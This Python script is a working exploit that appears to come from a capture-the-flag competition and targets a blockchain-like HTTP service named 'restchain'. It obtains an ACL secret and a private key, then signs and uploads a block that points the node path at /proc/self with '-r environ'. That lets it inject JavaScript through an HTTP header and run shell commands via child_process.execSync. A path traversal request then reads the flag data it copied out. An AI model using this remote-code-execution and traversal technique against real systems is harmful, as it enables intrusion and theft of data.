#!/usr/bin/env python3

import time
import requests

def exploit(api, flagid):
	code = """
	require('child_process').execSync('
		x()(
			b=BLOCK;
			d=$2/data;
			p=$1/restchain-persist;
			s=$d/blocks/$b;
			d=$d/public/node-env-injection/$b;
			test -x $p -a -f $s && $p $d < $s;
		);
		x /srv/restchain/bin /srv/restchain || x ./bin . || x . . || :
	');
	process.exit(0);
	//""".replace('\n', '').replace('\t', '').replace('BLOCK', flagid[:2] + '/' + flagid)
	print('generated code:', code)

	res = requests.get(api + '/acl/require-secret', params={'secret': 'exploit'})
	assert res.status_code == 200
	acl = res.text.strip()
	print('got acl:', repr(acl))

	res = requests.get(api + '/crypto/privatekey')
	assert res.status_code == 200
	priv = res.headers['X-Restchain-Private-Key']
	pub = res.headers['X-Restchain-Public-Key']
	headers = {
		'A': code,
		'X-Restchain-Acl-Secret': 'exploit',
		'X-Restchain-Block-Acl': acl,
		'X-Restchain-Block-Node-Path': '/proc/self',
		'X-Restchain-Block-Node-Options': '-r environ',
		'X-Restchain-Previous': '6' * 64,
		'X-Restchain-Private-Key': priv,
		'X-Restchain-Signer': pub,
	}
	res = requests.post(api + '/crypto/sign', headers=headers)
	assert res.status_code == 200
	headers['X-Restchain-Signature'] = res.headers['X-Restchain-Signature']
	res = requests.put(api + '/block', headers=headers, allow_redirects=False)
	assert res.status_code == 303
	block_id = res.headers['X-Restchain-Id']
	print('put RCE block at id', block_id)

	# The Go implementation randomizes the order of the environment variables,
	# so we have to reduce them as much as possible. Somehow I didn't manage to
	# get rid of the Accept-Encoding header with python-requests, so I just use
	# this one to transport the payload...
	for i in range(10):
		res = requests.get(api + '/block/' + block_id, headers={
			'Accept-Encoding': code,
			'Accept': None,
			'Connection': None,
			'User-Agent': None,
		})
		if res.status_code == 200:
			break
		print('failed executing code, trying again')
	assert res.status_code == 200
	print('executed code')

	res = requests.get(api + '/../node-env-injection/' + flagid[:2] + '/' + flagid)
	assert res.status_code == 200
	print('-' * 80)
	print(res.text)

if __name__ == '__main__':
	import sys
	exploit(*sys.argv[1:])
